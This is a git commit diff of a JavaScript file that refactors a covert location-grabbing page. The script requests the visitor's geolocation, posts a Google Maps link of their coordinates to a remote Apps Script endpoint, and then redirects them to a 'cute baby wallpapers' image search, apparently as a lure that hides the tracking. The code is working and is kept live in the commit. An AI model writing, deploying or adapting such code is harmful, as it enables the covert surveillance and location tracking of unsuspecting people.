81fb84aa100da1011c83fc58d3c90fb767810e81
Raju Pusti <rajupusti@yahoo.com>
2026-04-09 08:12:47 +0000

    Refactor geolocation data collection and improve code formatting

--- script.js
+++ script.js
@@ -1,41 +1,30 @@
- const API_URL =
-      "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
+const API_URL =
+  "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";
 
-    function collectAndSendData() {
-      let data = {};
+function collectAndSendData() {
+  let data = {};
 
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          const { latitude, longitude } = position.coords;
-          data.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
-          postData();
-        },
-         function () {
-         data.mapLink = "Location access denied";
-         postData();
-         window.location.href =
-              "https://www.google.com/search?q=cute+baby+girl+wallpaper+hd&tbm=isch";
-    }
-        
-      );
-      
+  navigator.geolocation.getCurrentPosition(
+    function (position) {
+      const { latitude, longitude } = position.coords;
+      data.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+      postData();
+    },
+    function () {
+      data.mapLink = "Location access denied"; 
+      postData();
+    },
+  );
 
+  function postData() {
+    fetch(API_URL, {
+      method: "POST",
+      body: JSON.stringify(data),
+    });
 
-        
-      function postData() {
-        fetch(API_URL, {
-          method: "POST",
-          body: JSON.stringify(data),
-        })
-          .then(() => {
-            window.location.href =
-              "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
-          })
-          .catch(() => {
-            window.location.href =
-              "https://www.google.com/search?q=cute+baby+girl+wallpaper+hd&tbm=isch";
-          });
-      }
-    }
+    window.location.href =
+      "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
+  }
+}
 
-    collectAndSendData();
+collectAndSendData();
